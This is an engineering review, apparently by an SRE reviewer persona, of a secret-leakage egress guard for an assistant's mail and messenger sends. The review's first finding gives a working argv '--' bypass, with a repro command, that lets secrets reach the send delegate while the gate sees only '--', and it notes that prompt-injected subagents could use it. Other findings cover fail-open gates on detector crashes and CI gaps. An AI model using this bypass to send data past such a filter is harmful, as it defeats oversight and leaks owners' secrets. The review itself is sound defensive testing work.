# Iteration 9 SRE review — muse-leakage-guard

**Reviewer persona:** Senior SRE — exit-code classification, rc=137, timeouts,
CI determinism, hung/flaky behavior, fault injection, logging, reproducibility.
**Target:** `~/workspace/skills/muse-leakage-guard` at HEAD `e35c1bc`
("Iteration 8: report integrity and readability").
**Constraints honored:** read-only review (no repo files modified); no network
sends; every shell context started with the stub-shim PATH first; all fault
probes ran against `/tmp` copies or with inert fake delegates; every payload
was synthetic (repo fixtures or `sk-testfake*`-shaped strings) — no real
private data reproduced or quoted.

**What iteration 8 changed** (from `git diff 2243723..e35c1bc`): `CHANGELOG.md`,
`README.md`, `SKILL.md`, `bin/adversarial-run` (4 lines: timeout failures now
count toward tier denominators), `bin/leakage-report` (tier grouping,
remediation rendering, no CLEAN badge on abnormal output). It did **not** touch
`bin/leakage-audit`, the stub gates/shims, or CI — so every iteration-8 SRE
finding about the audit, gates, and workflow is still live unless disproved
below.

**Baselines measured this session** (true CI-equivalent env: `env -i`, stub
shims first on PATH, inert fake delegates, `MOCHI_CRON_PROMPT_DIRS=""`,
isolated HOME with no denylist, `CI=true`):
- `bin/leakage-audit`: **64 passed · 0 failed · 4 skipped**
  (skips: memory-audit, cron prompts, egress denylist, gate-log — matches the
  four skip reasons CI pins).
- `bin/adversarial-run`: **36/36** matched (block 19/19 · review 9/9 · clean 8/8).

**Severity counts:** P0 ×1 · P1 ×4 · P2 ×9 · P3 ×12. Findings marked
[EXEC] were confirmed by running code; [STATIC] by reading.

---

## 1. Confirmed by execution

### [EXEC][P0] E1 — `--` end-of-options argv bypass: secret reaches the delegate while the gate judges `--`

**What.** Both shims' hand-rolled argv parsers treat a bare `--` token as an
ordinary word. For `gmail +send --to … --body -- <secret>`, the parser assigns
`body="--"` (the `--` is consumed as the value of `--body`; the real secret in
the next argv slot is dropped because `prev` was already cleared). The gate
judges the extracted content (`--` → clean → rc=0) and then `pass_through "$@"`
hands the **original argv, secret included**, to the delegate. Any delegate
honoring the near-universal `--` = end-of-options convention parses
`body=<secret>` and sends it.

**Repro** (stub shim, fake echo delegate, synthetic fixture secret):

```
MOCHI_REAL_HATCH_GWS_CLI=/tmp/echobin/real-gws \
  test/stub-memory-skill/bin/shims/hatch_gws_cli \
  gmail +send --to a@example.com --subject t --body -- "$SECRET"
# → shim rc=0; delegate received the full secret in argv
```

Same shape confirmed for `gmail +reply --body -- <secret>` (rc=0),
`hatch_messenger_cli send --cid 999 --text -- <secret>` (rc=0; gate saw stdin
content `--` only), and by parser trace for `users messages send --params --
<json>` (payload captured as `--`, real JSON passed through). The **real**
shim in `personal-memory-system` shares the parser shape (no `--` handling)
and was confirmed to pass a synthetic secret through with rc=0 against a fake
delegate. The real underlying CLI is a stripped ELF and was deliberately not
invoked (no live fire); whether it interprets `--` as end-of-options is the
only remaining hop, and it is the standard convention.

**Impact.** A working exfiltration bypass of attack-surface entry A1, which
`references/attack-surface.md` marks PROTECTED. It defeats the exact paths the
audit red-teams (`+send`, `+reply`, `send --text`) — a prompt-injection or
compromised subagent need only place `--` in argv. The audit has zero coverage
of this parser-confusion class (it tests `--draft`-as-value confusion, T-B19,
but not `--`).

**Remediation.**
- In both shims (stub first, then the real one): handle a bare `--` as
  end-of-options — after it, no token is a flag; if `prev` names a value slot,
  the next token is captured as the value *even if it starts with `-`*.
  Never drop a token from the gated extract while passing it to the delegate.
- Add audit probes: `send_expect "… --body -- <secret> blocked" 1 0 … --body
  -- "$(cat fixtures/secret.txt)"` for `+send`/`+reply`, the `users messages
  send --params --` form, and `messenger send --text --`.
- Add adversarial corpus cases with `--` in argv.
- Consider a structural fix: instead of re-parsing argv, gate the *effective*
  payload by asking the delegate to echo its parsed arguments in a dry-run
  mode — eliminates the entire parser-fidelity class.

### [EXEC][P1] E2 — Stub gates fail OPEN when the detector crashes

**What.** `test/stub-memory-skill/bin/egress-gate` and `bin/brief-gate` only
special-case detector rc 1 (block) and rc 2 (review); **every other nonzero
rc falls through to `exit 0` (allow)**. Replacing the detector with
`kill -9 $$` (SIGKILL, rc=137) yields rc=0 from *both* gates.

**Repro:** `/tmp` copy of the stub with `bin/memory-egress-check` replaced by
`kill -9 $$`; both gates returned rc=0 on block-tier synthetic content.

**Impact.** Direct violation of this repo's own `references/gate-interface.md`:
"Non-verdict errors (missing files, crashes, …) must fail closed — surface as
block (1) or another nonzero code, but NEVER as 0 (allow)." A crashed detector
means secrets flow with an ALLOW verdict. Explicitly deferred from iteration 8
(`hidden_files/iter8-synthesis.md`) — still present at HEAD.

**Remediation.** Map exit codes explicitly: `0 → allow; 1 → block; 2 →
needs-approval; *) → exit 1` (fail closed, loud). Apply identically to the
real gates. Add the fault-injection probe in E3.

### [EXEC][P1] E3 — The audit has no detector-crash probe; suite A only tests the fail-closed shape

**What.** `bin/leakage-audit` suite A (~line 321) tests operational failure by
*deleting the blockset* — the one crash shape that already fails closed
(detector exits 1). There is no probe for a detector that dies by signal,
segfaults, or exits 3/126/127 — exactly the shapes E2 shows fail open.

**Impact.** CI green cannot attest the fail-open class. Combined with E2, a
regression here ships with a CLEAN badge.

**Remediation.** Add a suite-A probe using a detector variant that
`kill -9 $$`s (and one that `exit 3`), expecting rc≠0 — specifically rc=1 per
the fail-closed contract once E2 is fixed. Run it against a `/tmp` stub copy
so the shipped stub stays pristine.

### [EXEC][P1] E4 — rc=137 is not recognized as timeout; TERM-resistant hangs misreport as verdict mismatches

**What.** `gate_expect` (`bin/leakage-audit:407`), `send_expect` (`:428`),
`live_send_expect` (`:520`), and `bin/adversarial-run:75` test only
`rc == 124`. But `timeout -k 10 30` on a child that traps TERM yields **137**,
not 124 (confirmed: `timeout -k 2 3` over a TERM-trapping direct child →
137; the shell even reports "Killed"). A 137 therefore falls into the generic
verdict-mismatch branch, which prints "timed out after 30s"-style remediation
that is wrong on two counts (it didn't time out at 30s, and the code path
taken isn't the timeout path).

**Impact.** A TERM-resistant hang — the most operationally dangerous kind —
is misclassified as a gate/adversarial *verdict* failure instead of a
timeout/runner failure, sending the responder down the wrong remediation.

**Remediation.** Add an `is_timeout_rc()` helper (`124` or `137`) and use it in
all four sites plus `bin/leakage-report:56` (`[ "$ADV_RC" -eq 124 ] && ADV_RC=3`
misses 137). Fix the adjacent comments claiming a "30s bound": with
`-k 10` the bound is up to **40s** for TERM-trapping children.

### [EXEC][P2] E5 — Corpus files without a trailing newline silently lose their last case in the runner, but the report renders all rows as ✓

**What.** `bin/adversarial-run:65` and `build-blockset.sh:32` use
`while IFS='|' read -r name want content; do … done < "$CORPUS"`. A final line
without `\n` is dropped by the loop (confirmed: 2-line corpus → loop saw 1
case), while `bin/leakage-report`'s F-card parser uses `splitlines()` and
renders **both** rows — the dropped case with `got` defaulting to `want`,
i.e. a ✓ it never earned.

**Impact.** Latent today (the shipped corpus ends with `\n`), but a dropped
`want=0` case silently shrinks adversarial coverage while the report shows a
full green table. A dropped `want=1` case is louder (stale blockset →
mismatch), but still a trap.

**Remediation.** Guard the loops: `while IFS='|' read -r name want content ||
[ -n "$name" ]; do …`. Additionally, assert at startup that the corpus ends
with a newline, and have the report cross-check `rows rendered ==
cases executed` instead of defaulting `got` to `want` (render `?` when the
runner has no record of the case).

### [EXEC][P2] E6 — Report mislabels local times as UTC (off by the UTC offset)

**What.** `bin/leakage-report:241` `fmt_ts()` takes the audit's `YYYY-MM-DD
HH:MM` stamp, declares it UTC, and converts to local. On a non-UTC machine the
label is wrong by the UTC offset. Confirmed on PDT: an audit run at 17:21 PDT
renders as "10:21 AM PDT (2026-09-17 17:21 UTC)" — 7 hours off.

**Impact.** Misleading forensic timestamps on every report generated outside
UTC (i.e. on the owner's own machine). Invisible in CI (UTC), which is why it
survived.

**Remediation.** Parse an optional trailing TZ abbreviation from the audit
stamp; if absent, emit the stamp verbatim without the `(… UTC)` claim, or
record the epoch in the audit header and format from that.

### [EXEC][P2] E7 — `[B] [B]` / `[A] [A]` finding-prefix duplication still in the HTML report

**What.** `bin/leakage-report:387` prepends `[B] ` (etc.) to finding text that
already starts with `[B] ` (the audit's `bad()` labels findings
`[A] …`/`[B] …`). Reproduced on a forced-red audit → report at HEAD:
`[B] [B] egress gate: clean passes`, `[A] [A] bin/egress-gate missing or not
executable`. Iteration 8 was supposed to check this on the red path ("if
reproduced, fix in 9") — reproduced.

**Impact.** Cosmetic, but it is the user-facing artifact of a validation
system; doubled prefixes erode trust in report hygiene.

**Remediation.** In `findings`, don't prepend the letter when
`c['text']` already starts with `[X]`; or strip the audit-side prefix before
re-adding it.

### [EXEC][P2] E8 — The report re-runs the audit and adversarial suite; CI asserts on the *first* run, so artifact and job status can diverge

**What.** `bin/leakage-report:44,54` runs the full audit (`timeout -k 10 600`)
and adversarial suite a **second** time inside the report step. But CI's
skip-set assertion and `rc/audit` / `rc/adversarial` files come from the
*first* runs. A flaky gate that passes run 1 and fails run 2 yields a **green
job with an ATTENTION artifact** (report rc=1 is tolerated by assert-green);
the reverse yields a red job with a CLEAN artifact. Either way the uploaded
artifact contradicts the job status. It also doubles CI runtime.

**Impact.** The validation's truthfulness — the product — is undermined
exactly when it matters (flaky/real failures).

**Remediation.** Give `leakage-report` `--audit-log/--adversarial-log` flags
and have CI pass run 1's logs; or make assert-green fail the job when the
report's verdict is ATTENTION. Either removes the redundant ~10–20 min of CI
time.

### [EXEC][P3] E9 — `interface_version` false-mismatches on a trailing comment

**What.** `bin/leakage-audit:262` parses with `cut -d= -f2 | tr -d
'[:space:]'`. A `.synthetic-stub` containing `interface_version=1 # comment`
parses as `1#comment` ≠ `1` → spurious version-mismatch failure (confirmed).

**Remediation.** Strip `#` comments before comparing.

### [EXEC][P3] E10 — No EXIT trap; audit temp dir cleanup is best-effort

**What.** `bin/leakage-audit` creates `$T` and removes it with a terminal
`rm -rf "$T"` only. `set -e` aborts, signals, or a `kill` leave the temp dir
(fixture copies, fake binaries, gate-log temp) behind.

**Remediation.** `trap 'rm -rf "$T"' EXIT` right after creation.

### [EXEC][P3] E11 — Machine-mode evidence is emitted 2–3× per failure and loses suite context

**What.** In `bad()`, `wdetail` is invoked once for display and again inside
`$(…)` to build `FINDINGS`; each call runs `msent "CTX $line"`. With
`MOCHI_AUDIT_MACHINE=1`, every failing check's evidence lines appear once
inline *and* again in the final Findings section — 98 `@@@ CTX` lines vs 33
unique on a forced-red run. `CTX` lines carry no suite letter, so the
findings-section copies are detached from their suite.

**Impact.** Machine parsers counting `@@@ CTX` triple-count evidence; the
report's CTX evidence parser (`leakage-report:90`) ingests duplicates.

**Remediation.** Suppress `msent` inside `wdetail` on one of the two calls
(e.g. a `WDETAIL_QUIET` flag for the captured call), and include the suite
letter in `CTX` lines (`CTX [B] …`).

---

## 2. Static analysis

### [STATIC][P1] S1 — CI pins four skip *reasons*, not totals; coverage can silently disappear green

**What.** `.github/workflows/validate.yml` asserts the exact skip-reason set
(memory-audit, cron prompts, egress denylist, gate-log) but never the number
of checks run. If a whole suite stopped executing (a broken loop, an early
`exit`, a glob matching nothing), CI stays green. `ITERATIONS.md` still
carries stale totals from earlier iterations (e.g. "57/0/4") while HEAD
measures **64/0/4** — the doc and the pipeline already disagree.

**Remediation.** Pin the totals CI-equivalent: assert `@@@ TOTAL 64 0 4` (and
`@@@ ADV MATCHED 36/36` with tier breakdown) in machine mode
(`MOCHI_AUDIT_MACHINE=1` already emits these sentinels). Regenerate
`ITERATIONS.md` from the CI log, or generate it *in* CI.

### [STATIC][P2] S2 — Timeout budgets are internally inconsistent

**What.** Per-probe timeouts: audit 30s (`timeout -k 10 30`); adversarial 10s
(`timeout -k 2 10`). Outer bounds: audit step `timeout-minutes: 10`, report
step `timeout-minutes: 15` — but the report step runs **two** serial
`timeout -k 10 600` invocations (up to 20 min) inside a 15-min step. Worst
case, 64 audit probes × 40s (TERM-trapping) ≈ 43 min of serial hangs before
the step kills it, truncating diagnostics mid-suite.

**Remediation.** One documented timeout budget: per-probe ≤ inner bound ≤
step `timeout-minutes` with headroom. Either raise the report step to 25 min
or (better, with E8) stop re-running the audit inside the report. Align
adversarial's 10s with the audit's 30s or justify the difference in
`references/test-matrix.md`.

### [STATIC][P2] S3 — Untimed gate-adjacent calls remain

**What.** No `timeout(1)` around: the suite-A operational-failure probe
(`bin/leakage-audit:321`), the blockset freshness `--check` (`:328`), the
Messenger stdin-replay hash check (`:506`), live-fire Gmail profile discovery
(`:539`), live-fire Messenger thread discovery (`:565`). A hung delegate or
detector here hangs the audit past its step budget.

**Remediation.** Wrap each in `timeout -k 10 30` (or the documented budget
from S2) and treat 124/137 as timeout per E4.

### [STATIC][P2] S4 — No CI fault-injection variants: timeout and abnormal-exit branches are dead code in CI

**What.** The 124-branches (`leakage-audit:407,428,520`, `adversarial-run:75`)
and any abnormal-exit handling never execute against the healthy stub. A
regression in those branches (wrong message, wrong rc mapping) is invisible.

**Remediation.** Add stub variants to CI: a slow gate (sleeps past the probe
timeout), a TERM-trapping gate (→137), a flaky gate (fails every Nth call),
and assert the audit classifies each correctly (timeout vs mismatch vs
fail-closed).

### [STATIC][P2] S5 — Stub gates never write `$MOCHI_EGRESS_LOG`; suite D is untested in CI

**What.** `grep` confirms neither stub gate references `MOCHI_EGRESS_LOG`.
Suite D's parsing (`grep -c "| BLOCKED$"` etc.) matches the real gate's log
format (`printf '%s | %s | %s\n'` — verified against the real gate), but no CI
run ever exercises it: suite D always takes the "log not found" skip.

**Remediation.** Have the stub gates append clearly-marked synthetic lines
(`leakage-audit:synthetic …`) to `$MOCHI_EGRESS_LOG` when set, or ship a
synthetic log fixture that suite D parses in CI. Either way the verdict-shape
contract (`clean`/`BLOCKED`/`approved-override`/`needs-approval`) gets pinned.

### [STATIC][P2] S6 — `SHAPES` and `STUB_SECRET_CAND` are independently maintained and can drift

**What.** `bin/leakage-audit:682` (fixture-purity check) and
`test/stub-memory-skill/build/build-blockset.sh` (blockset construction) each
carry their own secret-shape regex. Drift means a fixture value passes purity
but misses the blockset (false CLEAN on adversarial) or vice versa.

**Remediation.** Single source: one patterns file sourced by both, with a CI
check that they agree byte-for-byte.

### [STATIC][P3] S7 — Timeout comments are inaccurate

**What.** Comments at `bin/leakage-audit:407,428,520` describe a "30s bound";
with `-k 10` the bound is 40s for TERM-trapping children (see E4).

**Remediation.** Fix the comments when applying E4.

### [STATIC][P3] S8 — Suite-C mandate greps are substring checks, not mandate checks

**What.** `bin/leakage-audit:611-612,615,622` use bare `grep -q "bin/shims"`,
`grep -q "brief-gate"`, `grep -q "Free-share zones"`. A manual saying "do NOT
put bin/shims on PATH", or a commented-out cron prompt line, passes.

**Remediation.** Anchor to mandate-shaped lines (e.g. match `export PATH=…
bin/shims` uncommented), strip `#` comments before grepping cron files.

### [STATIC][P3] S9 — Suite-A operational probe runs before the temp-log redirect

**What.** The broken-stub probe (`bin/leakage-audit:321`) executes before
`export MOCHI_EGRESS_LOG="$T/gate.log"` (`:394`). Against a real target this
writes real-log lines (synthetic `leakage-audit:` contexts, but real log).

**Remediation.** Move the temp-log export above suite A.

### [STATIC][P3] S10 — `MOCHI_EGRESS_APPROVED` is not in the `local.env` saved-vars guard

**What.** `bin/leakage-audit` snapshots and restores a fixed var list around
`local.env` sourcing; `MOCHI_EGRESS_APPROVED` is absent while
`MOCHI_LIVE_FIRE` gets a loud guard. A stray `MOCHI_EGRESS_APPROVED=1` in
`local.env` would silently approve review-tier content through suite B.

**Remediation.** Add it to the saved-vars list (fail noisy, not silent).

### [STATIC][P3] S11 — Locale-unpinned `sort -u` in three places

**What.** `bin/leakage-audit:682`, `build-blockset.sh:48,50`. No `LC_ALL`
anywhere in the pipeline. Byte-order of the blockset and purity-check token
lists can vary by locale.

**Remediation.** `LC_ALL=C sort -u` (or export `LC_ALL=C` once per script).

### [STATIC][P3] S12 — Duplicate corpus names are not rejected

**What.** `bin/adversarial-corpus.txt` currently has unique names, but nothing
asserts it. A duplicate name would silently shadow one case in the runner
(last write wins in spirit) while the report lists both.

**Remediation.** Assert uniqueness at runner startup.

### [STATIC][P3] S13 — Malformed corpus lines render as ✓ in the report

**What.** `leakage-report`'s F-card falls back to `got = want` for any name the
runner didn't record, so a malformed line (dropped by the runner's
`nonstd` check, or never executed) renders as a passing row. The nonstd list
partially mitigates, but the row itself still shows ✓.

**Remediation.** Render `?`/unknown for unrecorded cases; fail the report if
any exist.

### [STATIC][P3] S14 — `leakage-report` normalizes 124→3 for `ADV_RC` but not 137

**What.** `bin/leakage-report:56`. Same class as E4, one line.

**Remediation.** Use the shared `is_timeout_rc` helper from E4.

### [STATIC][P3] S15 — No precondition checks for `timeout(1)` / `python3`

**What.** The audit assumes GNU `timeout` and `python3` (report generation).
On a machine without them, failures surface late and confusingly (e.g. report
step dies in the Python heredoc).

**Remediation.** `command -v timeout python3` up front with a clear skip/fail.

### [STATIC][P3] S16 — Artifact-upload failure does not fail CI

**What.** `validate.yml` assert-green checks the report file's existence in
the workspace, not the upload step's outcome. A failed upload still yields a
green job with no artifact.

**Remediation.** Assert `steps.upload.outcome == 'success'` in assert-green.

### [STATIC][P3] S17 — `BLOCKED` mislabels checkout/setup failures

**What.** If the checkout or setup step fails, the summary composes
`BLOCKED: <missing steps>` — but nothing was blocked; the run never started.

**Remediation.** Label it `UNKNOWN`/`infra-failure`, distinct from gate blocks.

### [STATIC][P3] S18 — No operational "red CI" runbook

**What.** When CI goes red there is no pointer for the responder: which logs,
which artifact, how to distinguish infra-red from gate-red from flaky-red.

**Remediation.** Short `references/ci-runbook.md`: read order
(summary → Findings → `@@@` sentinels → artifact), flake triage, who to page.

---

## 3. Verified solid (execution-backed)

- **Adversarial baseline is genuinely green:** 36/36 matched (block 19/19 ·
  review 9/9 · clean 8/8) against the stub, and the forced-red path fails
  loudly (report exits 1, HTML written, ATTENTION badge, no CLEAN badge on
  abnormal/missing adversarial output — the iteration-8 report fixes hold).
- **No randomness, no network in the validation path:** `grep` over
  `bin/leakage-audit`, `bin/leakage-report`, `bin/adversarial-run` and the
  stub finds no `RANDOM`/`shuf`/`curl`/`wget`. Runs are deterministic given
  the same target and environment.
- **Fail-closed shapes that do work:** missing blockset → rc=1 (suite-A probe
  passes); missing/unexecutable `bin/memory-egress-check` → rc=127 path is
  handled (`-x` check in `gate_file`); the audit's `set -u`/`set -e` didn't
  produce unbound-variable aborts in any run this session.
- **Suite-D grep shapes match the real gate's log format** (`%s | %s |
  %s\n` with verdicts `clean`/`BLOCKED`/`approved-override`/`needs-approval`)
  — the parser is correct, just never exercised in CI (S5).
- **local.env snapshot/restore is sound** for the vars it covers (saved vars
  win over `local.env`, including `unset`).
- **The `[B] [B]` duplication (E7) and CTX duplication (E11) are the only
  report-machinery defects found** — tier grouping, remediation rendering,
  and the abnormal-output guards from iteration 8 all behaved correctly on
  the forced-red run.

## 4. Notes for the iteration-9 coordinator

- E1 (`--` bypass) is the highest-value fix: it is demonstrated in the stub
  **and** the real shim, defeats tested/PROTECTED paths, and has zero audit
  coverage. The AI-researcher review's deferred P0 shim bypasses
  (`+reply-all`, `drafts send`, `updateAutoForwarding`, chat sends, calendar
  inserts, marketplace text) are the same *class* of gap (untested
  subcommand/argv shapes) and should be fixed together with E1's structural
  remediation.
- E2+E3 were explicitly deferred from iteration 8; both reproduced at HEAD.
  Fixing the gates without adding the crash probe (or vice versa) leaves the
  guarantee unattested.
- E4 (137) and S4 (fault variants) are one work item: add the TERM-trapping
  stub variant and the `is_timeout_rc` helper together.
- E8's fix (report consumes run-1 logs) also resolves S2's report-step
  budget overrun and ~halves CI minutes.
- The suspected `bad()`/`wdetail` machine-sentinel *corruption* did not
  reproduce as corruption — it is duplication without suite tags (E11, P3),
  not misattribution.
- `ITERATIONS.md` already disagrees with HEAD's measured totals (57/0/4 vs
  64/0/4); regenerate from CI when applying S1.

## Appendix — repro commands (all read-only, synthetic, /tmp-scoped)

All commands below start with the required shim PATH:
`export PATH="$HOME/workspace/skills/personal-memory-system/bin/shims:$PATH"`
and run from `~/workspace/skills/muse-leakage-guard`.

- **E1:** fake echo delegate via `MOCHI_REAL_HATCH_GWS_CLI`; invoke stub shim
  with `--body -- "$SECRET"` (synthetic fixture); observe rc=0 and secret in
  delegate argv.
- **E2:** `/tmp` stub copy; replace `bin/memory-egress-check` with
  `kill -9 $$`; run both stub gates; observe rc=0.
- **E4:** `timeout -k 2 3 bash -c 'trap "" TERM; sleep 10'` → rc=137, not 124.
- **E5:** 2-line corpus without trailing `\n` through the runner's
  `while read` loop (sees 1) vs report's `splitlines()` (renders 2).
- **E6:** `fmt_ts("2026-09-17 17:21")` on a PDT machine → "10:21 AM PDT
  (2026-09-17 17:21 UTC)".
- **E7:** `/tmp` stub copy with non-executable `bin/egress-gate`;
  `bin/leakage-report --out /tmp/r.html` → `[B] [B]` / `[A] [A]` in HTML.
- **E11:** same red stub, `MOCHI_AUDIT_MACHINE=1` audit → 98 `@@@ CTX` lines,
  33 unique.
- **Baselines:** `env -i PATH="<stub-shims>:<fake-delegates>:/usr/local/bin:/usr/bin:/bin"
  HOME=<empty> PERSONAL_MEMORY_SKILL=<stub> MOCHI_AGENTS_FILE=<stub>/AGENTS.md
  MOCHI_EGRESS_LOG=/tmp/x.log MOCHI_CRON_PROMPT_DIRS="" CI=true
  bash bin/leakage-audit` → 64/0/4; `bash bin/adversarial-run` → 36/36.
